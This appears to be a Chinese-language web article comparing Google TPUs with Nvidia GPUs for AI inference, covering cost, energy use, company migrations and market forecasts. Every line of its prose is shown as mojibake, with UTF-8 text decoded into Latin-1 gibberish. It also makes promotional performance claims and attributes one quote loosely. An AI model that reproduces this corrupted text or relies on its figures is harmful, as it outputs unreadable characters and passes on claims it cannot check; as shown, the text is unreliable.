<p>TPU åœ¨æµå¼é˜µåˆ—ä¸­è¡¨ç°å‡ºè‰²ï¼Œè¿™ç§ç¡¬ä»¶ç½‘æ ¼èƒ½å¤Ÿé«˜æ•ˆåœ°ä¼ è¾“æ•°æ®ï¼Œæ— éœ€é¢‘ç¹çš„å†…å­˜è¯»å–ï¼Œä»è€Œå¤§å¹…é™ä½å»¶è¿Ÿå’Œèƒ½è€—ã€‚è€Œè‹±ä¼Ÿè¾¾ GPU åˆ™å¦‚åŒåŠŸèƒ½å¼ºå¤§çš„ç‘å£«å†›åˆ€ï¼Œèƒ½å¤Ÿå³æ—¶è§£ç æŒ‡ä»¤ï¼Œä½†è¿™ä¼šå¢åŠ é¢å¤–çš„å¼€é”€ã€‚å¯¹äºæ¨ç†ä»»åŠ¡è€Œè¨€ï¼Œè¿™æ„å‘³ç€åœ¨ LLM ç­‰å·¥ä½œè´Ÿè½½ä¸‹ï¼ŒTPU çš„æ€§ä»·æ¯”æ˜¯è‹±ä¼Ÿè¾¾ H100 çš„å››å€ã€‚è°·æ­Œæœ€æ–°çš„ Ironwood (v7) TPU çš„é€Ÿåº¦æ˜¯ v6 çš„å››å€ï¼Œå³°å€¼è®¡ç®—èƒ½åŠ›æ˜¯ v5p çš„åå€ï¼Œæ¯ä¸€ä»£äº§å“éƒ½èƒ½å¸¦æ¥ 2-3 å€çš„æ€§ä»·æ¯”æå‡ã€‚</p>
<p>èƒ½æ•ˆæ˜¯å¦ä¸€é¡¹æ€æ‰‹çº§ä¼˜åŠ¿ã€‚TPU é‡‡ç”¨å‚ç›´ä¾›ç”µè®¾è®¡ï¼Œåœ¨æ‰§è¡Œæœç´¢æŸ¥è¯¢æ—¶æ¯” GPU èŠ‚èƒ½ 60-65%ã€‚åœ¨ MLPerf åŸºå‡†æµ‹è¯•ä¸­ï¼ŒTPU v5e åœ¨ 9 ä¸ªæ¨ç†ç±»åˆ«ä¸­çš„ 8 ä¸ªç±»åˆ«ä¸­é¢†å…ˆï¼Œä¾‹å¦‚ BERT æœåŠ¡ç­‰ä»»åŠ¡çš„å®Œæˆé€Ÿåº¦æ¯” A100 GPU å¿« 2.8 å€ã€‚</p>
<p>ä»·æ ¼æ˜¯å†³å®šæ€§å› ç´ ï¼ŒæŒ‰éœ€ä½¿ç”¨çš„ TPU v6e èµ·ä»·ä¸ºæ¯å°æ—¶ 1.375 ç¾å…ƒï¼Œç­¾è®¢é•¿æœŸåˆçº¦åå¯é™è‡³æ¯å°æ—¶ 0.55 ç¾å…ƒï¼Œå¹¶ä¸”æ— éœ€æ”¯ä»˜è‹±ä¼Ÿè¾¾çš„æˆæƒè´¹ã€‚ç”¨æˆ·åé¦ˆï¼Œä¸€ä¸ª v5e æ‰©å±•èˆ±ç›¸æ¯”å…«ä¸ª H100 æ‰©å±•èˆ±ï¼Œã€Œä»·æ ¼æ›´ä½ã€ï¼Œæ€§ä»·æ¯”æ›´é«˜ã€‚</p>
<p>2025 å¹´ AI èŠ¯ç‰‡å¯¹æ¯”ï¼šTPU ä¸ GPU æ­£é¢äº¤é”‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15f769b96748433f8e8452a600f304d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=wQ41QFhDZzAKJDUc%2F07UDvT98aw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è‹±ä¼Ÿè¾¾ä¼˜åŠ¿é€æ¸æ¶ˆå¤±</p>
<p>åœ¨çº¯ç²¹çš„æ¨ç†é¢†åŸŸï¼Œè‹±ä¼Ÿè¾¾çš„ä¼˜åŠ¿ï¼ˆçµæ´»æ€§ï¼‰åè€Œæˆäº†åŠ£åŠ¿ã€‚GPU è™½ç„¶èƒ½å¤„ç†å„ç§ä»»åŠ¡ï¼Œä½†åœ¨é AI æ“ä½œä¸Šå´ä¼šæµªè´¹å¤§é‡èµ„æºã€‚éšç€æ¨ç†é€æ¸å æ®ä¸»å¯¼åœ°ä½ï¼Œåƒ TPU è¿™æ ·çš„ä¸“ç”¨ ASIC èŠ¯ç‰‡æ­£åœ¨å‰Šå¼±è‹±ä¼Ÿè¾¾çš„è¿™ä¸€ä¼˜åŠ¿ã€‚è°·æ­Œäº‘çš„é«˜ç®¡ä»¬é¢„è®¡ï¼Œä»… TPU çš„é‡‡ç”¨å°±èƒ½å åˆ°è‹±ä¼Ÿè¾¾ 10% çš„æ”¶å…¥ã€‚è‹±ä¼Ÿè¾¾çš„æ¯›åˆ©ç‡é«˜è¾¾ 70-80%ï¼Œæ¥è‡ªé«˜æ•ˆç«äº‰å¯¹æ‰‹çš„ä»·æ ¼å‹åŠ›å¯èƒ½ä¼šæŒ¤å‹å…¶åˆ©æ¶¦ç©ºé—´ã€‚</p>
<p>ASIC ä¸ GPU çš„ AI ä¹‹äº‰ï¼šä¸ºä»€ä¹ˆä¸“ç”¨èŠ¯ç‰‡ä¸»å¯¼æ·±åº¦å­¦ä¹ æ¨ç†ï¼Ÿ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eff60740299b48328a609bfccaa7d688~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=YT6vQJJ2Jrar%2FKRFI9cP6JNZ1S8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¦ç†è§£ä¸ºä»€ä¹ˆ TPU æ­£åœ¨ç“¦è§£è‹±ä¼Ÿè¾¾çš„éœ¸ä¸»åœ°ä½ï¼Œæˆ‘ä»¬éœ€è¦æŒæ¡ ASICï¼ˆä¸“ç”¨é›†æˆç”µè·¯ï¼‰å’Œ GPUï¼ˆå›¾å½¢å¤„ç†å™¨ï¼‰ä¹‹é—´æ ¹æœ¬çš„æ¶æ„å·®å¼‚ã€‚è¿™ä¸ä»…ä»…æ˜¯æŠ€æœ¯ç»†èŠ‚çš„é—®é¢˜ï¼Œè€Œæ˜¯å†³å®šæ•°åäº¿ç¾å…ƒè®¡ç®—æ”¯å‡ºæˆè´¥çš„å…³é”®æ‰€åœ¨ã€‚</p>
<p>ä»€ä¹ˆæ˜¯ ASIC èŠ¯ç‰‡ï¼Ÿå®ƒä¸ GPU æœ‰ä½•ä¸åŒï¼Ÿ</p>
<p>GPU æ˜¯é€šç”¨å‹å¤„ç†å™¨ã€‚ æœ€åˆè®¾è®¡ç”¨äºå›¾å½¢æ¸²æŸ“ï¼ˆå› æ­¤å¾—åã€Œå›¾å½¢å¤„ç†å•å…ƒã€ï¼‰ï¼Œè‹±ä¼Ÿè¾¾åˆ©ç”¨å…¶å¹¶è¡Œå¤„ç†èƒ½åŠ›ï¼Œå°†å…¶é‡æ–°åº”ç”¨äºäººå·¥æ™ºèƒ½é¢†åŸŸã€‚åƒ H100 è¿™æ ·çš„ GPU åŒ…å«æ•°åƒä¸ª CUDA æ ¸å¿ƒï¼Œå¯ä»¥å¤„ç†å„ç§å·¥ä½œè´Ÿè½½ï¼šæ¸¸æˆã€è§†é¢‘ç¼–ç ã€ç§‘å­¦æ¨¡æ‹Ÿã€åŠ å¯†è´§å¸æŒ–çŸ¿ï¼Œå½“ç„¶è¿˜æœ‰ç¥ç»ç½‘ç»œã€‚è¿™ç§å¤šåŠŸèƒ½æ€§ä½¿ GPU æˆä¸ºäººå·¥æ™ºèƒ½æ—©æœŸæ—¶ä»£çš„ç‘å£«å†›åˆ€ã€‚</p>
<p>ä¸“ç”¨é›†æˆç”µè·¯ï¼ˆASICï¼‰æ˜¯ä¸“ä¸šèŠ¯ç‰‡ã€‚å®ƒä»¬ä»ä¸€å¼€å§‹å°±ä¸ºå•ä¸€ç”¨é€”è€Œè®¾è®¡ï¼Œ ç‰ºç‰²çµæ´»æ€§ä»¥æ¢å–æé«˜çš„æ•ˆç‡ã€‚è°·æ­Œçš„ TPU ä¸“ä¸ºçŸ©é˜µä¹˜æ³•å’Œå¼ é‡è¿ç®—è€Œç¡¬ç¼–ç ï¼Œè¿™æ˜¯ç¥ç»ç½‘ç»œçš„æ•°å­¦åŸºç¡€ã€‚æ¯ä¸ªæ™¶ä½“ç®¡ã€æ¯æ¡ç”µæºè½¨ã€æ¯æ¡æ•°æ®é€šè·¯éƒ½é’ˆå¯¹ä¸€ä¸ªç›®æ ‡è¿›è¡Œä¼˜åŒ–ï¼Œä»¥é—ªç”µèˆ¬çš„é€Ÿåº¦å’Œæœ€å°çš„èƒ½é‡æŸè€—å®Œæˆå¼ é‡è¿ç®—ã€‚</p>
<p>ä¸å¦¨è¿™æ ·ç†è§£ï¼ŒGPU å°±åƒä¸€ä½å¤šæ‰å¤šè‰ºçš„è¿åŠ¨å‘˜ï¼Œç²¾é€šå¤šé¡¹è¿åŠ¨ï¼›è€Œ ASIC åˆ™åƒä¸€ä½å¥¥è¿çŸ­è·‘è¿åŠ¨å‘˜ï¼Œåœ¨æŸä¸€æ–¹é¢æŠ€é«˜ä¸€ç­¹ã€‚å¯¹äºéœ€è¦ 24âœ–ï¸7âœ–ï¸365 å…¨å¤©å€™è¿è¡Œçš„æ¨ç†å·¥ä½œè´Ÿè½½ï¼Œä½ éœ€è¦çš„æ˜¯è¿™ä½çŸ­è·‘è¿åŠ¨å‘˜ã€‚</p>
<p>ASIC ä¼˜åŠ¿ï¼šä¸ºä»€ä¹ˆä¸“ä¸šåŒ–èƒ½å¤Ÿè§„æ¨¡åŒ–åˆ¶èƒœ?</p>
<p>èƒ½æ•ˆæ–¹é¢ï¼š ASIC èŠ¯ç‰‡æ¶ˆé™¤äº†æŒ‡ä»¤è§£ç çš„å¼€é”€ã€‚GPU åŠ¨æ€åœ°è·å–ã€è§£ç å’Œæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ¶ˆè€—å¤§é‡å‘¨æœŸå’Œç”µåŠ›ã€‚TPU åˆ™åœ¨ç¡¬ä»¶ä¸­æ‰§è¡Œå›ºå®šæ“ä½œï¼Œåœ¨ç›¸åŒå·¥ä½œè´Ÿè½½ä¸‹èƒ½è€—é™ä½ 60-65%ã€‚åœ¨æ•°æ®ä¸­å¿ƒè§„æ¨¡ä¸‹ï¼Œè¿™æ„å‘³ç€èŠ‚çœæ•°ç™¾ä¸‡ç¾å…ƒçš„ç”µåŠ›æˆæœ¬å¹¶å‡å°‘å†·å´åŸºç¡€è®¾æ–½ã€‚</p>
<p>é™ä½å»¶è¿Ÿï¼š TPU ä¸­çš„è„‰åŠ¨é˜µåˆ—å¯åˆ›å»ºç¡®å®šæ€§çš„æ•°æ®æµï¼Œä¿¡æ¯åœ¨èŠ¯ç‰‡å†…åŒæ­¥æµåŠ¨ï¼Œå¦‚åŒç²¾å¿ƒç¼–æ’çš„è£…é…çº¿ï¼Œè€Œ GPU ä¾èµ–äºå…·æœ‰ä¸å¯é¢„æµ‹è®¿é—®æ¨¡å¼çš„å†…å­˜å±‚æ¬¡ç»“æ„ï¼ˆL1/L2 ç¼“å­˜ã€HBMï¼‰ï¼Œä»è€Œå¼•å…¥å»¶è¿Ÿå³°å€¼ã€‚å¯¹äºå®æ—¶æ¨ç†ï¼ˆèŠå¤©æœºå™¨äººã€è‡ªåŠ¨é©¾é©¶æ±½è½¦ã€é‡‘èäº¤æ˜“ï¼‰è€Œè¨€ï¼Œæ¯«ç§’çº§çš„å»¶è¿Ÿè‡³å…³é‡è¦ã€‚</p>
<p>æ¯æ¬¡æ“ä½œæˆæœ¬ï¼š ASIC é€šè¿‡å»é™¤æœªä½¿ç”¨çš„ç”µè·¯ï¼Œä»¥æ›´å°‘çš„æŠ•å…¥æä¾›æ›´é«˜çš„è®¡ç®—èƒ½åŠ›ã€‚åœ¨ Transformer å‹å·ä¸Šï¼ŒTPU çš„æ¯ç¾å…ƒæ€§èƒ½æ˜¯ H100 çš„å››å€ï¼Œå› ä¸ºæ¯ä¸€å¹³æ–¹æ¯«ç±³çš„ç¡…ç‰‡éƒ½ç‰©å°½å…¶ç”¨ã€‚GPU åˆ™æ‰¿è½½ç€è¯¸å¤šå†—ä½™ï¼šçº¹ç†å•å…ƒã€å…‰æ …åŒ–æ“ä½œã€æ˜¾ç¤ºæ§åˆ¶å™¨ç­‰ç­‰ï¼Œæ‰€æœ‰è¿™äº›åœ¨ AI æ¨ç†æœŸé—´éƒ½å¤„äºé—²ç½®çŠ¶æ€ã€‚</p>
<p>å¯æ‰©å±•æ€§ï¼š ASIC å¯ä»¥ç´§å¯†é›†æˆåˆ°å®šåˆ¶ç³»ç»Ÿä¸­ã€‚è°·æ­Œçš„ TPU pod é€šè¿‡å®šåˆ¶äº’è¿è¿æ¥ 4096 ä¸ªèŠ¯ç‰‡ï¼Œå®ç°äº† PCIe å—é™ GPU æ— æ³•å®ç°çš„è¿‘ä¹çº¿æ€§çš„æ‰©å±•ã€‚è¿™ç§æ¶æ„ä¸Šçš„è‡ªç”±åº¦ä½¿è¶…å¤§è§„æ¨¡æ•°æ®ä¸­å¿ƒèƒ½å¤Ÿæ„å»ºå®Œå…¨ç¬¦åˆè‡ªèº«éœ€æ±‚çš„æ¨ç†é›†ç¾¤ã€‚</p>
<p>æƒè¡¡å–èˆï¼šçµæ´»æ€§ä¸æ•ˆç‡</p>
<p>ASIC èŠ¯ç‰‡å¹¶éä¸‡èƒ½ï¼Œå®ƒä»¬çš„ä¸“ç”¨æ€§ä¹Ÿæ˜¯å®ƒä»¬çš„å±€é™æ€§ã€‚è®­ç»ƒæ–°çš„æ¨¡å‹æ¶æ„ã€å°è¯•æ–°çš„å±‚æˆ–è¿è¡Œé AI å·¥ä½œè´Ÿè½½éƒ½éœ€è¦ GPU çš„çµæ´»æ€§ã€‚å› æ­¤ï¼Œæœªæ¥å¹¶éã€ŒASIC vs GPUã€ä¹‹äº‰ï¼Œè€Œæ˜¯æˆ˜ç•¥éƒ¨ç½²ï¼šGPU ç”¨äºç ”ç©¶å’Œè®­ç»ƒï¼ŒASIC ç”¨äºç”Ÿäº§æ¨ç†ã€‚</p>
<p>æ–°å…´çš„ ASIC èŠ¯ç‰‡æ ¼å±€ï¼š é™¤äº† TPU ä¹‹å¤–ï¼Œäºšé©¬é€Šçš„ Trainiumã€å¾®è½¯çš„ Maia ä»¥åŠ Cerebras å’Œ Groq ç­‰åˆåˆ›å…¬å¸æ­£ä»¥å„ç§ä¸“ç”¨èŠ¯ç‰‡æ¶Œå…¥å¸‚åœºã€‚æ¯æ¬¾èŠ¯ç‰‡éƒ½é’ˆå¯¹ç‰¹å®šçš„ç»†åˆ†é¢†åŸŸï¼ˆLLM æ¨ç†ã€è®­ç»ƒã€ç¨€ç–æ¨¡å‹ï¼‰ï¼Œä»è€Œæ‰“ç ´äº†æ›¾ç»ç”±è‹±ä¼Ÿè¾¾ç»Ÿä¸€çš„ CUDA ç‹å›½ã€‚</p>
<p>ç»“è®ºæ˜¯ä»€ä¹ˆï¼Ÿå¯¹äºä»¥æ¨ç†ä¸ºä¸»å¯¼çš„æœªæ¥ï¼ˆåˆ° 2030 å¹´å°†å è®¡ç®—æ€»é‡çš„ 75%ï¼‰ï¼ŒASIC èŠ¯ç‰‡ä¸ä»…å…·æœ‰ç«äº‰åŠ›ï¼Œè€Œä¸”åŠ¿åœ¨å¿…è¡Œã€‚ç‰©ç†å®šå¾‹å†³å®šäº†è¿™ä¸€ç‚¹ï¼šå¤§è§„æ¨¡ä¸“ä¸šåŒ–æ˜¯æ— æ³•è¶…è¶Šçš„ã€‚è‹±ä¼Ÿè¾¾æ·±è°™æ­¤é“ï¼Œå› æ­¤å¤§åŠ›æ¨è¿›åƒ Blackwell è¿™æ ·é’ˆå¯¹æ¨ç†ä¼˜åŒ–çš„æ¶æ„ï¼Œä½†ä»–ä»¬è¯•å›¾è®©ä¸€æŠŠç‘å£«å†›åˆ€æ¯”æ‰‹æœ¯åˆ€æ›´é”‹åˆ©ã€‚</p>
<p>ç°å®ä¸–ç•Œçš„èƒœåˆ©ï¼šAI å·¨å¤´æŠ¼æ³¨ TPU</p>
<p>è¿ç§»æ¡ˆä¾‹å°±æ˜¯æœ€å¥½çš„è¯æ˜ã€‚å…¨çƒé¡¶å°–çš„äººå·¥æ™ºèƒ½è¿è¥å•†æ­£åœ¨æ”¾å¼ƒè‹±ä¼Ÿè¾¾å¤„ç†å™¨ï¼Œè½¬è€Œä½¿ç”¨ TPUï¼Œä»è€Œå¤§å¹…é™ä½æˆæœ¬ï¼Œå¹¶ä»¥å‰æ‰€æœªæœ‰çš„æ–¹å¼æ‰©å±•æ¨ç†èƒ½åŠ›ã€‚</p>
<p>Midjourney çš„ 65% æˆæœ¬å‰Šå‡</p>
<p>å›¾åƒç”Ÿæˆå™¨ Midjourney æ›¾æ˜¯ GPU çš„ä¸»åŠ›å†›ï¼Œä½†åœ¨ 2024 å¹´è½¬å‘ TPU åï¼Œä¾¿å†ä¹Ÿæ²¡æœ‰å›å¤´ã€‚æ¨ç†æˆæœ¬éª¤é™ 65%ï¼Œä»æ¯æœˆ 200 ä¸‡ç¾å…ƒé™è‡³ 70 ä¸‡ç¾å…ƒã€‚æ ¹æ® Cohere çš„ç±»ä¼¼åŸºå‡†æµ‹è¯•ï¼Œä½¿ç”¨ TPU v6e åï¼Œç”Ÿæˆä»»åŠ¡çš„ååé‡æå‡äº† 3 å€ã€‚ã€ŒTPU åœ¨æ¨ç†å·¥ä½œè´Ÿè½½æ–¹é¢çš„ç»æµæ•ˆç›Šã€è¢«è¯æ˜å…·æœ‰å˜é©æ€§æ„ä¹‰ï¼Œé‡Šæ”¾äº†ç ”å‘èµ„é‡‘ã€‚</p>
<p>Anthropic çš„ç™¾ä¸‡ TPU ç™»æœˆè®¡åˆ’</p>
<p>Claude çš„å¼€å‘å•† Anthropic å…¬å¸ä¸è°·æ­Œè¾¾æˆäº†ä¸€é¡¹ä»·å€¼æ•°ç™¾äº¿ç¾å…ƒçš„äº¤æ˜“ï¼Œæ‰¿è¯ºæä¾›å¤šè¾¾ä¸€ç™¾ä¸‡ä¸ª TPUã€‚åˆ° 2026 å¹´ï¼Œè¿™å°†é‡Šæ”¾è¶…è¿‡ 1GW çš„è®¡ç®—å®¹é‡ï¼Œå¹¶å°† TPU ä¸äºšé©¬é€Š Trainium å’Œè‹±ä¼Ÿè¾¾çš„ç›¸ç»“åˆï¼Œæ„å»ºå¤šå…ƒåŒ–çš„æŠ€æœ¯æ ˆã€‚é¦–å¸­æ‰§è¡Œå®˜ Thomas Kurian è¡¨ç¤ºï¼Œã€Œå“è¶Šçš„æ€§ä»·æ¯”å’Œæ•ˆç‡ã€æ˜¯ä¿ƒæˆæ­¤æ¬¡äº¤æ˜“çš„å…³é”®å› ç´ ã€‚è‡ª 2023 å¹´ä»¥æ¥ï¼ŒTPU ä¸€ç›´ä¸º Claude æä¾›è®¡ç®—åŠ¨åŠ›ã€‚</p>
<p>Meta çš„æ•°åäº¿ç¾å…ƒè½¬å‘</p>
<p>Meta æ˜¯è‹±ä¼Ÿè¾¾æœ€å¤§çš„å®¢æˆ·ï¼ˆè®¡åˆ’ 2025 å¹´æ”¯å‡º 720 äº¿ç¾å…ƒï¼‰ï¼Œç›®å‰æ­£å°±ä¸€é¡¹ä»·å€¼æ•°åäº¿ç¾å…ƒçš„ TPU éƒ¨ç½²è¿›è¡Œæ·±å…¥æ´½è°ˆã€‚Meta è®¡åˆ’ä» 2026 å¹´é€šè¿‡è°·æ­Œäº‘ç§Ÿèµ TPU å¼€å§‹ï¼Œå¹¶è®¡åˆ’åœ¨ 2027 å¹´ä¹‹å‰éƒ¨ç½²æœ¬åœ° TPUï¼Œç”¨äº Llama å¾®è°ƒç­‰éœ€è¦å¤§é‡å¼ é‡çš„å·¥ä½œè´Ÿè½½ã€‚è¿™ç§æ··åˆç­–ç•¥ï¼ˆè‹±ä¼Ÿè¾¾æä¾›çµæ´»æ€§ï¼ŒTPU æä¾›æ•ˆç‡ï¼‰é¢„ç¤ºç€æ›´å¹¿æ³›çš„èµ„æºè¿ç§»è¶‹åŠ¿ã€‚</p>
<p>è¿™äº›å¹¶éä¸ªä¾‹ã€‚Salesforce å’Œ Cohere éƒ½å®ç°äº† 3 å€çš„å¢é•¿ï¼Œè°·æ­Œçš„ Gemini è¿è¡Œåœ¨æ•°ä¸‡ä¸ª TPU ä¸Šã€‚é‚£äº›ç²¾æ˜çš„è¿è¥å•†çº·çº·æŠ›å”®è‹±ä¼Ÿè¾¾çš„æº¢ä»·äº§å“ï¼Œè½¬è€Œé€‰æ‹©è°·æ­Œçš„æ€§ä»·æ¯”æ›´é«˜çš„äº§å“ã€‚</p>
<p>ä½•æ—¶é€‰æ‹© TPU ä¸è‹±ä¼Ÿè¾¾æ˜¾å¡ï¼šAI åŸºç¡€è®¾æ–½çš„å†³ç­–çŸ©é˜µ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1b962416e254a5b9d399c7c05e8c2de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=JfxEKU4P46hfhQWsZanvU1UtVlU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é€‰æ‹© TPU è¿˜æ˜¯è‹±ä¼Ÿè¾¾ GPU å¹¶ééæ­¤å³å½¼ã€‚è¿™å–å†³äºæ‚¨çš„å·¥ä½œè´Ÿè½½ã€è§„æ¨¡å’ŒåŸºç¡€æ¶æ„ç­–ç•¥ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºäºå®é™…éƒ¨ç½²çš„å®ç”¨æ¡†æ¶ï¼š</p>
<p>å¦‚æœæ‚¨ç¬¦åˆä»¥ä¸‹æ¡ä»¶ï¼Œè¯·é€‰æ‹© TPUï¼š</p>
<p>æˆæœ¬é˜ˆå€¼ï¼š æ¨ç†æˆæœ¬è¶…è¿‡æ¯æœˆ 5 ä¸‡ç¾å…ƒã€‚åœ¨æ­¤è§„æ¨¡ä¸‹ï¼ŒTPU èŠ‚çœçš„æˆæœ¬ï¼ˆ40-65%ï¼‰è¶³ä»¥æŠµæ¶ˆè¿ç§»å¸¦æ¥çš„é¢å¤–å¼€é”€ã€‚</p>
<p>å·¥ä½œè´Ÿè½½é€‚ç”¨æ€§ï¼š å¤§è§„æ¨¡è¿è¡Œ LLM æœåŠ¡ã€æ¨èç³»ç»Ÿã€å›¾åƒç”Ÿæˆæˆ–è§†é¢‘å¤„ç†ã€‚è¿™äº›å¼ é‡å¯†é›†å‹æ“ä½œæ­£æ˜¯ TPU çš„ä¼˜åŠ¿æ‰€åœ¨ã€‚</p>
<p>äº‘å¹³å°éƒ¨ç½²ï¼š ç†Ÿæ‚‰ Google Cloud ç”Ÿæ€ç³»ç»Ÿæˆ–æ„¿æ„é‡‡ç”¨ TensorFlow/JAX æ¡†æ¶ã€‚</p>
<p>å¯æŒç»­å‘å±•ç›®æ ‡ï¼š ç¯å¢ƒå’Œèƒ½æºæ•ˆç‡æ˜¯é‡ä¸­ä¹‹é‡ã€‚TPU çš„åŠŸè€—æ¯”åŒç­‰ GPU é…ç½®ä½ 60-65%ï¼Œè¿™å¯¹å®ç° ESG ç›®æ ‡è‡³å…³é‡è¦ã€‚</p>
<p>å¯é¢„æµ‹çš„æ‰©å±•ï¼šÂ å…·æœ‰ä¸€è‡´æµé‡æ¨¡å¼çš„å¤§å®¹é‡ç”Ÿäº§æ¨ç†ï¼Œè€Œä¸æ˜¯å®éªŒæ€§ç ”ç©¶ã€‚</p>
<p>å¦‚æœæ‚¨éœ€è¦ä»¥ä¸‹åŠŸèƒ½ï¼Œè¯·é€‰æ‹©è‹±ä¼Ÿè¾¾æ˜¾å¡ï¼š</p>
<p>è®­ç»ƒçµæ´»æ€§ï¼š æ„å»ºè‡ªå®šä¹‰æ¶æ„ã€å¤šæ¨¡æ€æ¨¡å‹ï¼Œæˆ–è¿›è¡Œéœ€è¦ CUDA ç‰¹å®šåº“å’Œå·¥å…·é“¾çš„ç ”ç©¶ã€‚</p>
<p>å¤šäº‘æˆ˜ç•¥ï¼š è¦æ±‚ç¡¬ä»¶èƒ½å¤Ÿåœ¨ AWSã€Azure å’Œæœ¬åœ°æ•°æ®ä¸­å¿ƒä¹‹é—´ç§»æ¤ï¼Œä¸”ä¸å—ä¾›åº”å•†é”å®šã€‚</p>
<p>å¤šæ ·åŒ–çš„å·¥ä½œè´Ÿè½½ï¼š é™¤äº†æœºå™¨å­¦ä¹ ä»»åŠ¡å¤–ï¼Œè¿˜å¯ä»¥è¿è¡Œå›¾å½¢æ¸²æŸ“ã€æ¨¡æ‹Ÿã€æ¸¸æˆæˆ–éäººå·¥æ™ºèƒ½è®¡ç®—ã€‚</p>
<p>é¢„ç®—é™åˆ¶ï¼š æ¯æœˆ AI è®¡ç®—é¢„ç®—ä½äº 2 ä¸‡ç¾å…ƒã€‚è®¾ç½®å¼€é”€å’Œè¿ç§»æˆæœ¬ä½¿å¾— TPU åœ¨å°è§„æ¨¡åº”ç”¨ä¸­ä¸å¤ªåˆ’ç®—ã€‚</p>
<p>å‰æ²¿æ¨¡å‹ï¼š å°è¯•ä½¿ç”¨å°šæœªé’ˆå¯¹ TPU ç¼–è¯‘è¿›è¡Œä¼˜åŒ–æˆ–éœ€è¦è‡ªå®šä¹‰å†…æ ¸çš„æ¶æ„ã€‚</p>
<p>æ··åˆæˆ˜ç•¥ï¼šä¼ä¸šè¡ŒåŠ¨æŒ‡å—</p>
<p>éµå¾ª Meta çš„æ¨¡å¼ï¼šéƒ¨ç½² Nvidia H100 ç”¨äºè®­ç»ƒã€å®éªŒå’Œæ¨¡å‹å¼€å‘ï¼Œä½¿ç”¨ TPU v6e/v7 è¿›è¡Œç”Ÿäº§æ¨ç†æœåŠ¡ã€‚è¿™ç§æ¨¡å¼å…¼é¡¾äº†çµæ´»æ€§å’Œæˆæœ¬ä¼˜åŒ–ï¼Œåœ¨ä¿æŒç ”ç©¶çµæ´»æ€§çš„åŒæ—¶ï¼Œå¯èŠ‚çœ 40-50% çš„æ€»è®¡ç®—èµ„æºã€‚</p>
<p>å®æ–½æ—¶é—´è¡¨ï¼š å¤§è§„æ¨¡ TPU è¿ç§»é¢„è®¡éœ€è¦ 2-6 ä¸ªæœˆï¼ŒåŒ…æ‹¬ä»£ç åº“é€‚é…ã€æµ‹è¯•å’Œæµé‡é€æ­¥è½¬ç§»ã€‚åƒ Midjourney è¿™æ ·çš„å…¬å¸é€šè¿‡é™ä½æˆæœ¬ï¼Œåœ¨ 3-4 ä¸ªæœˆå†…å³å¯å®ç°æŠ•èµ„å›æŠ¥ã€‚</p>
<p>æœªè¢«å®šä»·çš„æœªæ¥ï¼šæ¨ç†çš„ 75% æ„¿æ™¯ä¸å¤§è§„æ¨¡ AI çš„éšæ€§æˆæœ¬</p>
<p>æ²¡äººçœŸæ­£å®šä»·çš„æ˜¯ä»€ä¹ˆï¼Ÿæ¨ç†çš„è§„æ¨¡æ˜¯æ— é™çš„ã€‚è®­ç»ƒåªæ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘ï¼Œæ¨ç†æ‰æ˜¯ç»æµçš„å‘½è„‰ã€‚æ¯ä¸€æ¬¡æŸ¥è¯¢ï¼ˆæ¯å¤©æ•°åäº¿æ¬¡ï¼‰éƒ½ä¼šæŒç»­å¢åŠ æˆæœ¬ã€‚OpenAI 23 äº¿ç¾å…ƒçš„è´¦å•ï¼Œé‚£åªæ˜¯ 2024 å¹´çš„è´¹ç”¨ï¼›å¦‚æœè§„æ¨¡æ‰©å¤§åˆ° 2030 å¹´å æ® 75% çš„å¸‚åœºä»½é¢ï¼Œé‚£å°†æ˜¯æ•°ä¸‡äº¿ç¾å…ƒã€‚</p>
<p>é¢„æµ‹ç»“æœæç»˜å‡ºä¸€å¹…é²œæ˜çš„ç”»é¢ï¼š</p>
<p>å¸‚åœºå¢é•¿ï¼š åˆ° 2030 å¹´ï¼Œäººå·¥æ™ºèƒ½æ¨ç†å¸‚åœºè§„æ¨¡å°†è¾¾åˆ° 2550 äº¿ç¾å…ƒï¼Œå¤åˆå¹´å¢é•¿ç‡è¾¾ 19.2%ã€‚è¿™å°†è¿œè¿œè¶…è¿‡è®­ç»ƒå¸‚åœºï¼Œåè€…éšç€åŸºç¡€æ¨¡å‹çš„æˆç†Ÿè€Œè¶‹äºå¹³ç¨³ã€‚</p>
<p>èƒ½æºå±æœºï¼š ç”¨äºå‰æ²¿æ¨¡å‹çš„ 5GW é›†ç¾¤ï¼Œå ªæ¯”å°å›½çš„ç”µç½‘ã€‚éšç€æ¨ç†é›†ç¾¤çš„æ‰©å¼ ï¼Œæ•°æ®ä¸­å¿ƒé¢ä¸´å®¹é‡é™åˆ¶ã€‚</p>
<p>æˆæœ¬å€æ•°ï¼š è®­ç»ƒåŸºçº¿æˆæœ¬ä¸º 15 å€ï¼Œä½†å®é™…ä½¿ç”¨é‡ä¼šè¿›ä¸€æ­¥æ¨é«˜æˆæœ¬ã€‚æ¯å¢åŠ ä¸€ä¸ªç”¨æˆ·ã€æ¯å¢åŠ ä¸€é¡¹åŠŸèƒ½ã€æ¯æ¬¡å®æ—¶äº¤äº’éƒ½ä¼šå¢åŠ è´¹ç”¨ã€‚</p>
